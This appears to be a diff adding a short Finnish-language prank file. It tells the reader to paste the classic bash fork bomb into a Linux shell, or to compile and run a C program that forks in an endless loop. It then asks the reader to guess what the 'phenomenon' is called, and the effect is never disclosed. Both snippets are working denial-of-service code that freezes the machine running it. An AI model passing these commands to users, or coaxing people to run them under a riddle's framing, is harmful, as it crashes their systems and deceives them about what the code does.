@@ -1,0 +1,19 @@
+//Kirjoita Linuxin shelliin
+
+:(){ :|:& };:
+
+
+
+//tai tee C-koodi, käännä ja aja-----ja ihmettele
+
+#include <unistd.h>
+ 
+ int main(void)
+ {
+         while(1)
+                 fork();
+ }
+
+//Mitä sait aikaan ja yritä keksi millä nimellä tätä ilmiötä kutsutaan Linux-koodareittein keskuudessa? 
+
+//PS. Ei kannata yrittää selvinpäin :)
